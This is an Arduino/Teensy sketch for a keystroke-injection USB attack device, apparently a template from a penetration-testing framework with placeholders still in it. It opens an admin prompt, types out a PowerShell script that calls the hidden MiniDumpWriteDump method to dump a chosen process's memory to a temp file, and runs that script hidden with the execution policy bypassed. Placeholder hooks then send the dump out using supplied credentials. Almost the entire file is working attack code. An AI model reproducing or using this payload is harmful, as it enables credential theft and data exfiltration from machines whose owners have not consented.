#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif


void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Memory dump\" > %temp%\\mdmp.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting') >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $WERNM = $WER.GetNestedType('NativeMethods', 'NonPublic') >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $Flags = [Reflection.BindingFlags] 'NonPublic, Static' >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $MDW = $WERNM.GetMethod('MiniDumpWriteDump', $Flags) >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $MDF = [UInt32] 2 >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $PrI = Get-Process \"INPUT4\" >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $PrN = $PrI.ProcessName >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $PrH = $PrI.Handle >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $FSt = New-Object IO.FileStream(\"$env:temp\\$PrN.dmp\", [IO.FileMode]::Create) >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $Result = $MDW.Invoke($null, @($PrH,$ProcessId,$FSt.SafeFileHandle,$MDF,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)) >> %temp%\\mdmp.ps1");
  Keyboard.println("echo $FSt.Close() >> %temp%\\mdmp.ps1");
  delay(2000);

  String fn = "mdmp";
  String fp = "$env:temp\\$PrN.dmp";
  EXFILCALLS

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\mdmp.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\mdmp.ps1\"),0,true >> %temp%\\mdmp.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\mdmp.vbs");
  delay(3000);

  Keyboard.println("exit");

}

void loop(){
}

DEFS
EXFILDEFS
